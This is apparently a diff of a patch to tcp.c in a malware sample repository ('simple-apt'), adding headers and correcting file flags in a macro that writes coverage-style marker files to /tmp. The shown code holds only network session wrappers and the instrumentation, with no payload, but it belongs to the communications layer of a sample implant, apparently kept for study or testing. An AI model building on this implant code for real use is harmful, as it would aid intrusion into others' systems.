@@ -1,19 +1,20 @@
 diff --git a/malware/cross-platform/simple-apt/simple/src/tcp.c b/malware/cross-platform/simple-apt/simple/src/tcp.c
-index 5d3a9e8..5425880 100644
+index 5d3a9e8..91fe987 100644
 --- a/malware/cross-platform/simple-apt/simple/src/tcp.c
 +++ b/malware/cross-platform/simple-apt/simple/src/tcp.c
-@@ -11,6 +11,10 @@
+@@ -11,6 +11,11 @@
  
  #include <stdio.h>
  #include <assert.h>
-+#include <sys/types.h>
-+#include <sys/stat.h>
++#include <errno.h>
 +#include <fcntl.h>
++#include <sys/stat.h>
++#include <sys/types.h>
 +#include <unistd.h>
  
  
  void tcp_init()
-@@ -37,6 +41,25 @@ void tcp_cleanup()
+@@ -37,6 +42,26 @@ void tcp_cleanup()
  #endif
  }
  
@@ -32,14 +33,15 @@ index 5d3a9e8..5425880 100644
 +#define TC_MARK1(tc_marker_num, tc_begin_end)                \
 +    { sprintf(tc_fspec, "/tmp/tc-marker-%03d-%s.txt",        \
 +              tc_marker_num, tc_begin_end);                  \
-+      int tc_fd = open(tc_fspec, O_CREAT | O_APPEND, 0644);  \
++      int tc_flags = O_WRONLY | O_APPEND | O_CREAT;          \
++      int tc_fd = open(tc_fspec, tc_flags, 0644);            \
 +      int n = write(tc_fd, ".", 1);                          \
 +      close(tc_fd);                                          \
 +    }
  
  // Inits a new network comms session.
  // Returns -1 on failure, 0 on success.
-@@ -45,7 +68,7 @@ int tcp_initSession(const char *ip, unsigned short port)
+@@ -45,7 +70,7 @@ int tcp_initSession(const char *ip, unsigned short port)
  #ifdef WINDOWS
  	return tcp_windows_initSession(ip, port);
  #elif NIX
@@ -48,7 +50,7 @@ index 5d3a9e8..5425880 100644
  #else
  	assert(0);
  	return -1;
-@@ -60,7 +83,7 @@ int tcp_startSession()
+@@ -60,7 +85,7 @@ int tcp_startSession()
  #ifdef WINDOWS
  	return tcp_windows_startSession();
  #elif NIX
